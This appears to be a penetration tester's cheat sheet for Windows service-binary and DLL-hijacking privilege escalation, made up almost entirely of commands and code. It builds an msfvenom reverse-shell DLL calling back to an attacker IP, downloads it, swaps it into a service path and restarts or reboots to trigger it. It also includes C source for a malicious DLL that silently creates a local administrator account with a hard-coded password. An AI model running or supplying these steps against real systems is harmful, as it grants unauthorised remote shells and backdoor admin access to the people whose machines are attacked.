# Finding  and permissions
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

```
-----------------------

# Vulnerable service binary exploitation
```bash
# Check permissions we need F or M
icacls C:\Users\steve\Pictures\example.exe

# Create payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=443 -f dll -o example.dll

# Transfer payload
iwr -uri http://192.168.45.188/example.dll -Outfile example.dll

# Put shell on correct path
move .\example.dll C:\Path\To\DLL\example.dll

# Starting the service
net stop example-service
net start example-service
Start-Service example-service
Stop-Service example-service
Restart-Service example-service

---

# If no permission to restart service but service is auto and we have shutdown privilege

# Check auto start
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'example-service'}

> example-serve Auto

# Set shutdown privilege
whoami /priv

> SeShutdownPrivilege 

# shutdown
shutdown /r /t 0
```

-----------------------

# Alternative DLL binary

```bash
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compiling the dll
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
